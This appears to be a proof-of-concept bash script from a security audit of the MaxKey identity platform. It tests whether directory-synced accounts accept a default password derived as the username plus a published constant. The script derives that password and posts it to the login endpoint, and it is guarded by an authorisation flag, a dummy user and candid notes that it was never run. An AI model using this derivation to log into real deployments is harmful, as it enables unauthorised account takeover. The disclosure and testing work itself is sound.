#!/usr/bin/env bash
# =============================================================================
#  repro-sync-default-password.sh
#
#  ###########################################################################
#  #  NOT EXECUTED BY THE AUDIT.                                          #
#  #  This script was WRITTEN but NEVER RUN. The audit environment had no #
#  #  MaxKey instance, no network access, no database and no directory    #
#  #  server. Every "EXPECTED IF VULNERABLE" / "EXPECTED IF FIXED"        #
#  #  statement below is a PREDICTION derived from reading the source, NOT #
#  #  an observation.                                                     #
#  ###########################################################################
#
#  FINDING
#    maxkey-20261002-sync-default-password
#
#  SOURCE BASIS (verified by reading the repo at commit
#                 3e5662b1a91291c0d85de826544119c86e77d8e6)
#    1. The default password is derived from the username:
#         maxkey-entity/src/main/java/org/dromara/maxkey/entity/idm/UserInfo.java:53
#           public static final String DEFAULT_PASSWORD_SUFFIX = "MaxKey@888";
#       so password == username + "MaxKey@888".
#    2. Five synchronisers set exactly that on every synced account:
#         maxkey-synchronizers/maxkey-synchronizer-ldap/.../LdapUsersService.java:90
#         maxkey-synchronizers/maxkey-synchronizer-activedirectory/.../ActiveDirectoryUsersService.java:98
#         maxkey-synchronizers/maxkey-synchronizer-feishu/.../FeishuUsersService.java:70
#         maxkey-synchronizers/maxkey-synchronizer-workweixin/.../WorkweixinUsersService.java:147
#         maxkey-synchronizers/maxkey-synchronizer-dingtalk/.../DingtalkUsersService.java:80
#           userInfo.setPassword(userInfo.getUsername() + UserInfo.DEFAULT_PASSWORD_SUFFIX);
#    3. Unlike finding 1, this value IS bcrypt-hashed before storage, so the
#       stored column is not plaintext. The defect is the DERIVABLE DEFAULT,
#       not the storage.
#    4. No first-login rotation is enforced on this path.
#
#  CONSEQUENCE BEING TESTED
#    Anyone who can enumerate usernames (directory sync implies the user list is
#    knowable, and a lot of organisations use predictable usernames) can derive
#    that account's password offline, with no interaction with the server.
#
#  WHAT THIS SCRIPT ADDS
#    Harness-free proof: it derives the password purely from a username, exactly
#    as an attacker would, and then checks whether the running instance accepts
#    it. The derivation is trivially reproducible by a reader of the source; the
#    only thing this script adds is the confirmation that the account is live and
#    that rotation has not been forced.
#
#  WHAT IT CANNOT PROVE
#    * It cannot prove any particular user is synced from a directory. If the
#      user does not exist, that is INCONCLUSIVE, not FIXED.
#    * It cannot tell "never synced" from "synced and then rotated". Check
#      PASSWORDSETTYPE / PASSWORDLASTSETTIME to distinguish.
#
#  PREREQUISITES
#    * A DISPOSABLE MaxKey instance you own and are authorised to test.
#    * A synchroniser configured against a DUMMY directory (or any account you
#      created specifically for this test). The script defaults to the dummy
#      user from seed/two-tenant-seed.sql.
#    * curl.
#
#  USAGE
#    POC_I_HAVE_AUTHORIZATION=1 \
#    POC_TARGET_HOST=http://127.0.0.1:8080 \
#    ./repro-sync-default-password.sh
#
#  Environment:
#    POC_TARGET_HOST      (required) base URL of the disposable instance
#    POC_I_HAVE_AUTHORIZATION=1  (required) acknowledgement of authorisation
#    POC_SYNC_USERNAME    (optional, default: poc_tenant2_user) the synced DUMMY user
#    POC_EXPECT_INSTID    (optional, default: poc-inst-2) institution to log in against
#    POC_CAPTCHA_VALUE    (optional) solved captcha, if captcha is enabled
#    POC_SHOW_PASSWORD    (optional) set to 1 to print the derived password.
#                               The derived value is a known constant by design,
#                               so printing it reveals nothing secret.
# =============================================================================

set -uo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
. ./_lib.sh

SCRIPT_NAME="repro-sync-default-password.sh"
poc_guard "$SCRIPT_NAME"

HOST="${POC_TARGET_HOST%/}"
SYNC_USER="${POC_SYNC_USERNAME:-poc_tenant2_user}"
INSTID="${POC_EXPECT_INSTID:-poc-inst-2}"
SUFFIX="MaxKey@888"

trap poc_cleanup EXIT

# -----------------------------------------------------------------------------
# STEP 1 — derive the password the way an attacker would: username + a constant
#          that is published in the open-source repository.
# -----------------------------------------------------------------------------
DERIVED="${SYNC_USER}${SUFFIX}"

echo
echo "=============================================================================="
echo " Finding 2: directory sync sets a derivable default password"
echo "   username        : $SYNC_USER"
echo "   suffix (public) : $SUFFIX   (UserInfo.java:53)"
echo "=============================================================================="
echo
echo "[STEP 1] derive the default password offline, with no server interaction"
echo "         derived = username + suffix = $DERIVED"
if [ "${POC_SHOW_PASSWORD:-}" = "1" ]; then
  echo "         value   = $DERIVED"
fi
poc_info "this derivation used only the username and a constant from the source tree."
echo

# -----------------------------------------------------------------------------
# STEP 2 — does the account exist? Query the admin API.
# -----------------------------------------------------------------------------
echo "[STEP 2] confirm the account exists on the instance"
SEARCH_CODE=$(poc_curl GET "$HOST/api/idm/Users/.search?instId=$INSTID&username=$SYNC_USER" \
  -u "${POC_ADMIN_USER:-admin}:${POC_ADMIN_PASS:-}")
SEARCH_BODY=$(poc_body)
poc_info "GET /api/idm/Users/.search -> HTTP $SEARCH_CODE"
poc_require_reachable "$HOST/api/idm/Users/.search" "$SCRIPT_NAME"

if printf '%s' "$SEARCH_BODY" | grep -q "$SYNC_USER"; then
  poc_info "the account '$SYNC_USER' exists"
  EXISTS=1
else
  poc_info "the account was not returned (HTTP $SEARCH_CODE)"
  printf '%s\n' "$SEARCH_BODY" | head -c 300
  echo
  EXISTS=0
fi
echo

if [ "$EXISTS" = "0" ]; then
  poc_inconclusive "the account does not exist on this instance, so nothing can be"
  poc_inconclusive "concluded. Point POC_SYNC_USERNAME at a genuinely synced dummy user."
  echo
  echo "  Note: the .search endpoint takes POC_ADMIN_USER/POC_ADMIN_PASS, or your"
  echo "  deployment's bearer token. A 401 here means the API auth failed, NOT that"
  echo "  the account is absent."
  poc_summary "$SCRIPT_NAME"
  exit 0
fi

# -----------------------------------------------------------------------------
# STEP 3 — attempt the login with the derived password.
# -----------------------------------------------------------------------------
echo "[STEP 3] attempt login with the DERIVED default password"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * Login succeeds and an auth token is returned. The account is"
echo "      reachable with a password anyone can derive from the username."
echo "  EXPECTED IF FIXED"
echo "    * Login is refused, e.g. because first-login rotation was enforced or"
echo "      the operator changed the account."
echo

LOGIN_GET_CODE=$(poc_curl GET "$HOST/login/get")
STATE=$(poc_body | sed -n 's/.*"state"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
if [ -z "$STATE" ]; then
  STATE=""
  poc_info "no state token returned by /login/get; continuing without one"
fi

CAPTCHA="${POC_CAPTCHA_VALUE:-}"
PAYLOAD=$(printf '{"username":"%s","password":"%s","captcha":"%s","state":"%s","authType":"0"}' \
  "$SYNC_USER" "$DERIVED" "$CAPTCHA" "$STATE")

LOGIN_CODE=$(poc_curl POST "$HOST/login/signin" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  --data-raw "$PAYLOAD")
LOGIN_BODY=$(poc_body)
poc_info "POST /login/signin -> HTTP $LOGIN_CODE"
poc_require_reachable "$HOST/login/signin" "$SCRIPT_NAME"

echo
echo "----------------- RESPONSE BODY -----------------"
printf '%s\n' "$LOGIN_BODY" | head -c 1500
echo
echo "-----------------------------------------------"
echo

if printf '%s' "$LOGIN_BODY" | grep -qiE '"(authToken|accessToken|jwtToken|token)"[[:space:]]*:[[:space:]]*"[^"]+"'; then
  poc_vulnerable "the DERIVED default password was ACCEPTED for '$SYNC_USER'."
  poc_vulnerable "No rotation was enforced on first login."
  echo
  echo "    The password was derived entirely from the username plus a constant"
  echo "    published at UserInfo.java:53. No brute force was involved."
  echo
  echo "    If this account is genuinely directory-synced, the same derivation"
  echo "    works for EVERY synced account in the deployment."
elif printf '%s' "$LOGIN_BODY" | grep -qiE 'captcha'; then
  poc_inconclusive "the response mentions a captcha. Supply POC_CAPTCHA_VALUE and"
  poc_inconclusive "re-run. This is a test-setup failure, NOT a fixed result."
elif printf '%s' "$LOGIN_BODY" | grep -qiE 'expired|password|chang'; then
  poc_vulnerable "the login was refused with a change-password/expired prompt rather"
  poc_vulnerable "than outright denied. That still means the DERIVED password was"
  poc_vulnerable "accepted as correct, and the account is reachable."
  echo
  echo "    Inspect the response above: a 'must change password' response confirms"
  echo "    the derived value authenticated successfully."
else
  poc_fixed "the derived password was refused (HTTP $LOGIN_CODE)."
fi

# -----------------------------------------------------------------------------
# STEP 4 — database cross-check by hand.
# -----------------------------------------------------------------------------
echo
echo "[STEP 4] database cross-check (run by hand, this script has no DB access)"
echo
echo "    SELECT USERNAME, LEFT(PASSWORD,7) AS password_prefix,"
echo "           PASSWORDSETTYPE, PASSWORDLASTSETTIME"
echo "      FROM mxk_userinfo WHERE USERNAME = '$SYNC_USER';"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * password_prefix is '{bcrypt}' — the value IS hashed, which is the one"
echo "      thing this finding gets RIGHT. The defect is that the plaintext was"
echo "      derivable in the first place, not how it is stored."
echo "    * PASSWORDSETTYPE indicates the value was set by the synchroniser and"
echo "      never rotated."
echo "  EXPECTED IF FIXED"
echo "    * PASSWORDSETTYPE shows a user-driven change, or PASSWORDLASTSETTIME is"
echo "      later than the last synchronisation run."

echo
echo "[REMINDER] Any account you used here is now known to have a derivable"
echo "           password. Delete it or rotate it before the instance is reused."

poc_summary "$SCRIPT_NAME"
